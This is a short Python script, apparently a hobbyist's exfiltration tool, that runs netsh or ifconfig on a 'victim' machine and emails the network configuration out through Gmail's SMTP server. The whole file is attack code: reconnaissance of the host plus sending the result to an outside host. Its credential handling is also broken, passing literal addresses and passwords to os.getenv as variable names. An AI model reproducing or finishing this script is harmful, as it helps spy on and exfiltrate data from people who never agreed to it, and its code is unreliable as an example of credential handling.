import subprocess
import smtplib
import platform
import os
from Mail_Generator.temp_mail_generator import EmailSender

# This doesn't work because i would have to setup a gmail with app passwords,
# but the idea remains the same. Plus the victim needs to have python installed
# for this to work.  

def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

def get_network_config():
    try:
        # Check the OS and use appropriate command for network config
        if platform.system() == "Windows":
            command = 'netsh interface ipv4 show config'
        elif platform.system() == "Linux":
            command = 'ifconfig'
        elif platform.system() == "Darwin":  # macOS
            command = 'ifconfig'
        else:
            raise Exception("Unsupported OS")

        result = subprocess.check_output(command, shell=True)
        return result.decode()  # Decoding byte output to string
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return None

# Example usage
email = os.getenv("test@gmail.com")  # Store email in an environment variable
password = os.getenv("test123")  # Store password in an environment variable

message = get_network_config()
if message:
    send_mail(email, password, message)
